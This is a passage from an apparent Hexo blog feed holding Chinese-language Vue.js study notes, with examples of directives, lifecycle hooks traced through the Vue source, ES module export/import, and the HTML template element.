class="string">'https://www.sohu.com/'</span>,</span></span><br><span class="line"><span class="undefined">           &#125;</span></span><br><span class="line"><span class="undefined">       &#125;)</span></span><br><span class="line"><span class="undefined">   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="v-model：双向绑定"><a href="#v-model：双向绑定" class="headerlink" title="v-model：双向绑定"></a>v-model：双向绑定</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">   <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">'app'</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123; msg &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'text'</span> <span class="attr">v-model</span>=<span class="string">'msg'</span>&gt;</span>   <span class="comment">&lt;!--双向绑定--&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">       <span class="keyword">let</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">           el:<span class="string">'#app'</span>,</span></span><br><span class="line"><span class="undefined">           data:&#123;</span></span><br><span class="line"><span class="javascript">               msg:<span class="string">""</span></span></span><br><span class="line"><span class="undefined">           &#125;</span></span><br><span class="line"><span class="undefined">       &#125;)</span></span><br><span class="line"><span class="undefined">   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="v-show-v-if：显示与隐藏"><a href="#v-show-v-if：显示与隐藏" class="headerlink" title="v-show / v-if：显示与隐藏"></a>v-show / v-if：显示与隐藏</h2><p>相同点：v-if与v-show都可以动态控制dom元素显示隐藏</p><p>不同点：v-if将dom元素整个添加或删除，而v-show隐藏则是为该元素添加css–display:none，dom元素还在。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">'app'</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-if</span>=<span class="string">'isIf'</span>&gt;</span>我是v-if<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-show</span>=<span class="string">'isShow'</span>&gt;</span>我是v-show<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">       <span class="keyword">let</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">           el:<span class="string">'#app'</span>,</span></span><br><span class="line"><span class="undefined">           data:&#123;</span></span><br><span class="line"><span class="javascript">               isIf:<span class="literal">true</span>,</span></span><br><span class="line"><span class="javascript">               isShow:<span class="literal">false</span></span></span><br><span class="line"><span class="undefined">           &#125;</span></span><br><span class="line"><span class="undefined">       &#125;)</span></span><br><span class="line"><span class="undefined">   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="v-once：渲染一次"><a href="#v-once：渲染一次" class="headerlink" title="v-once：渲染一次"></a>v-once：渲染一次</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">'app'</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123; msg &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'text'</span> <span class="attr">v-model</span>=<span class="string">'msg'</span>&gt;</span>   </span><br><span class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-once</span>&gt;</span>&#123;&#123; msg &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span>       <span class="comment">&lt;!--msg值变化，但是显示不变--&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">       <span class="keyword">let</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">           el:<span class="string">'#app'</span>,</span></span><br><span class="line"><span class="undefined">           data:&#123;</span></span><br><span class="line"><span class="javascript">               msg:<span class="string">""</span></span></span><br><span class="line"><span class="undefined">           &#125;</span></span><br><span class="line"><span class="undefined">       &#125;)</span></span><br><span class="line"><span class="undefined">   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="v-cloak：解决闪烁"><a href="#v-cloak：解决闪烁" class="headerlink" title="v-cloak：解决闪烁"></a>v-cloak：解决闪烁</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css">       <span class="selector-attr">[v-cloak]</span>&#123;</span></span><br><span class="line"><span class="css">           <span class="selector-tag">display</span><span class="selector-pseudo">:none</span></span></span><br><span class="line"><span class="undefined">       &#125;</span></span><br><span class="line"><span class="undefined">   </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">'app'</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123; msg &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-cloak</span>&gt;</span> &#123;&#123; msg &#125;&#125; <span class="tag">&lt;/<span class="name">h1</span>&gt;</span>   <span class="comment">&lt;!--解决闪烁问题--&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">div</span></span></span><br><span class="line"><span class="tag">       </span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">       let vm = new Vue(&#123;</span><br><span class="line">           el:'#app',</span><br><span class="line">           data:&#123;</span><br><span class="line">               msg:"123"</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;)</span><br><span class="line">   <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="关于vue的生命周期"><a href="#关于vue的生命周期" class="headerlink" title="关于vue的生命周期"></a>关于vue的生命周期</h2><p>理解这个之前，我准备去下载一下vue的源码去看一下，new Vue()之后到底发生了哪些事情。</p><p>首先去github上搜索vue，下载标上tag的稳定版本。</p><p>下载好后，找到<code>src/core/index.js</code>,里面这样一行代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'./instance/index'</span></span><br></pre></td></tr></table></figure><p>找到<code>instance/index</code>，里面有这样一个函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Vue</span> (<span class="params">options</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (process.env.NODE_ENV !== <span class="string">'production'</span> &amp;&amp;</span><br><span class="line">    !(<span class="keyword">this</span> <span class="keyword">instanceof</span> Vue)</span><br><span class="line">  ) &#123;</span><br><span class="line">    warn(<span class="string">'Vue is a constructor and should be called with the `new` keyword'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">this</span>._init(options)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以我们在使用<code>new Vue（）</code>时就是调用了上面的<code>function Vue()</code>里面的过程，从<code>new Vue()</code>开始，</p><blockquote><p>Vue实例有一个完整的生命周期，也就是从开始创建、初始化数据、编译模板、挂载Dom、渲染→更新→渲染、卸载等一系列过程，我们称这是Vue的生命周期。通俗说就是Vue实例从创建到销毁的过程，就是生命周期。 </p></blockquote><p>那我们继续寻找，<code>this._init()</code>做了哪些事情呢，找到<code>init.js</code>这个文件，找到了如下函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vue.prototype._init = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>这个在原型上定义的函数就应该是初始化的过程，函数里有很多，但是我看到了如下代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">initLifecycle(vm)</span><br><span class="line">   initEvents(vm)</span><br><span class="line">   initRender(vm)</span><br><span class="line">   callHook(vm, <span class="string">'beforeCreate'</span>)</span><br><span class="line">   initInjections(vm) <span class="comment">// resolve injections before data/props</span></span><br><span class="line">   initState(vm)</span><br><span class="line">   initProvide(vm) <span class="comment">// resolve provide after data/props</span></span><br><span class="line">   callHook(vm, <span class="string">'created'</span>)</span><br></pre></td></tr></table></figure><p>到这里我就明白了，这是按顺序的初始化流程，其中的<code>callHook</code>就是钩子函数，我们可以在vue实例的钩子函数中写一些自己的操作，然后就会在这里被调用，如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">            el: <span class="string">"#app"</span>,</span></span><br><span class="line"><span class="xml">            template: "<span class="tag">&lt;<span class="name">div</span>&gt;</span>hello world<span class="tag">&lt;/<span class="name">div</span>&gt;</span>",</span></span><br><span class="line"><span class="javascript">            beforeCreate: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="string">"beforeCreate"</span>)</span></span><br><span class="line"><span class="undefined">            &#125;,</span></span><br><span class="line"><span class="javascript">            created: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="string">"created"</span>)</span></span><br><span class="line"><span class="undefined">            &#125;,</span></span><br><span class="line"><span class="javascript">            beforeMount: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="keyword">this</span>.$el)</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="string">"beforeMount"</span>)</span></span><br><span class="line"><span class="undefined">            &#125;,</span></span><br><span class="line"><span class="javascript">            mounted: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="string">"mounted"</span>)</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="keyword">this</span>.$el)</span></span><br><span class="line"><span class="undefined">            &#125;,</span></span><br><span class="line"><span class="javascript">            beforeDestroy: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="string">"beforeDestroy"</span>)</span></span><br><span class="line"><span class="undefined">            &#125;,</span></span><br><span class="line"><span class="javascript">            destroyed: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="string">"destroyed"</span>)</span></span><br><span class="line"><span class="undefined">            &#125;,</span></span><br><span class="line"><span class="javascript">            beforeUpdate: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="string">"beforeUpdate"</span>)</span></span><br><span class="line"><span class="undefined">            &#125;,</span></span><br><span class="line"><span class="javascript">            updated: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="string">"updated"</span>)</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">        &#125;);</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">        beforeCreate</span></span><br><span class="line"><span class="comment">        created</span></span><br><span class="line"><span class="comment">        &lt;div id='app'&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="comment">        beforeMount</span></span><br><span class="line"><span class="comment">        mounted</span></span><br><span class="line"><span class="comment">        &lt;div&gt;hello world&lt;/div&gt;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><p>下图是官方给的一张图：</p><p><img src="https://cn.vuejs.org/images/lifecycle.png" alt="1"></p><h2 id="export与import的使用"><a href="#export与import的使用" class="headerlink" title="export与import的使用"></a>export与import的使用</h2><p>现在有两个文件a.js和b.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//a.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">var</span> a = <span class="string">'my name is a'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//b.js</span></span><br><span class="line"><span class="keyword">import</span> &#123;a&#125; <span class="keyword">from</span> <span class="string">'./a.js'</span>;</span><br><span class="line"><span class="built_in">console</span>.log(a)</span><br></pre></td></tr></table></figure><h3 id="export多个变量"><a href="#export多个变量" class="headerlink" title="export多个变量"></a>export多个变量</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//a.js</span></span><br><span class="line"><span class="keyword">var</span> a1=<span class="string">'my name is a1'</span>,a2=<span class="string">'my name is a2'</span>;</span><br><span class="line"><span class="keyword">export</span> &#123;a1,a2&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//b.js</span></span><br><span class="line"><span class="keyword">import</span> &#123;a1,a2&#125; <span class="keyword">from</span> <span class="string">'./a.js'</span>;</span><br><span class="line"><span class="built_in">console</span>.log(a1,a2)</span><br></pre></td></tr></table></figure><h3 id="export-default-的用法"><a href="#export-default-的用法" class="headerlink" title="export default 的用法"></a>export default 的用法</h3><p>export 之后加上default意指默认接口的意思，在一个文件里面默认的只能有一个  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//b.js</span></span><br><span class="line"><span class="keyword">var</span> b = <span class="string">'myname is b'</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> b</span><br><span class="line"></span><br><span class="line"><span class="comment">//a.js</span></span><br><span class="line"><span class="keyword">import</span> b <span class="keyword">from</span> <span class="string">'./b.js'</span>;</span><br><span class="line"><span class="built_in">console</span>.log(b)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-2020.4.21</title>
      <link href="2020/04/21/%E6%97%A5%E5%B8%B8-2020.4.21/"/>
      <url>2020/04/21/%E6%97%A5%E5%B8%B8-2020.4.21/</url>
      
        <content type="html"><![CDATA[<h1 id="今日清单"><a href="#今日清单" class="headerlink" title="今日清单"></a>今日清单</h1><p>昨天项目在微信开发者工具上成功运行，今天准备看代码的时候发现微信开发者工具识别不了vue文件，就换了vscode，安装了Vetur插件之后搞定。</p><ul><li>template标签</li><li>简单写了一个小程序</li></ul><a id="more"></a><h2 id="template标签"><a href="#template标签" class="headerlink" title="template标签"></a>template标签</h2><p>看代码时最先看到的就是这个标签，之前没有学习过，首先要知道这个标签不是vue特有的。</p><p>根据MDN上的解释：</p><blockquote><p><strong>HTML内容模板（<template>）元素</template></strong>是一种用于保存客户端内容机制，该内容在加载页面时不会呈现，但随后可以(原文为 may be)在运行时使用JavaScript实例化。</p><p>将模板视为一个可存储在文档中以便后续使用的内容片段。虽然解析器在加载页面时确实会处理<strong><template></template></strong>元素的内容，但这样做只是为了确保这些内容有效；但元素内容不会被渲染。</p></blockquote><p><strong>content属性:通过该属性可以获取template标签中的内容 </strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--template标签默认设置了display:none--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">'tem'</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"div1"</span>&gt;</span>我是template中的盒子1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">'div2'</span>&gt;</span>我是template中的盒子2<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> o = <span class="built_in">document</span>.getElementById(<span class="string">'tem'</span>)</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(o.content) <span class="comment">//#document-fragment</span></span></span><br><span class="line"><span class="javascript">       <span class="built_in">console</span>.log(o.content.querySelectorAll(<span class="string">"div"</span>)) <span class="comment">//NodeList(2) [div#div1, div#div2]</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="vue中的template"><a href="#vue中的template" class="headerlink" title="vue中的template"></a>vue中的template</h3><p>此处部分参考与<a href="https://blog.csdn.net/u010510187/article/details/100356624" target="_blank" rel="noopener">这里</a></p><ul><li>在vue实例里面：template标签中的内容显示，在dom中不存在template标签 </li><li>不在vue实例里：template标签中的内容在页面中不显示，但是在dom结构存在该标签及内部结构 </li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!--此处的template标签中的内容显示并且在dom中不存在template标签--&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">div</span>&gt;</span>我是template<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">div</span>&gt;</span>我是template<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">&lt;!--此处的template标签中的内容在页面中不显示，但是在dom结构存在该标签及内部结构--&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">"tem"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"div1"</span>&gt;</span>我是template<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span>&gt;</span>我是template<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./vue.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">     <span class="keyword">let</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">         el: <span class="string">"#app"</span>,</span></span><br><span class="line"><span class="undefined">     &#125;);</span></span><br><span class="line"><span class="undefined"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>那template到底在vue中有什么作用呢，我们知道元素可以使用<code>v-if</code>控制显示，那么多个元素呢？</p><h3 id="在template元素上使用-v-if-条件渲染分组"><a href="#在template元素上使用-v-if-条件渲染分组" class="headerlink" title="在template元素上使用 v-if 条件渲染分组"></a>在template元素上使用 v-if 条件渲染分组</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">'app'</span>&gt;</span></span><br><span class="line"></span><br><span class="line">     <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-if</span>=<span class="string">"false"</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">p</span>&gt;</span>Paragraph 1<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">p</span>&gt;</span>Paragraph 2<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./vue.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">     <span class="keyword">let</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">         el: <span class="string">"#app"</span>,</span></span><br><span class="line"><span class="undefined">     &#125;);</span></span><br><span class="line"><span class="undefined"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>注意：v-show不支持template元素</strong></p><h3 id="使用v-for的template渲染多个元素"><a href="#使用v-for的template渲染多个元素" class="headerlink" title="使用v-for的template渲染多个元素"></a>使用v-for的template渲染多个元素</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">'app'</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-for</span>=<span class="string">'item in items'</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123; item.msg &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>haha<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./vue.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">            el: <span class="string">"#app"</span>,</span></span><br><span class="line"><span class="undefined">            data:&#123;</span></span><br><span class="line"><span class="undefined">                items:[</span></span><br><span class="line"><span class="javascript">                    &#123; <span class="attr">msg</span>:<span class="string">"1"</span> &#125;,</span></span><br><span class="line"><span class="javascript">                    &#123; <span class="attr">msg</span>:<span class="string">"2"</span> &#125;,</span></span><br><span class="line"><span class="javascript">                    &#123; <span class="attr">msg</span>:<span class="string">"3"</span> &#125;,</span></span><br><span class="line"><span 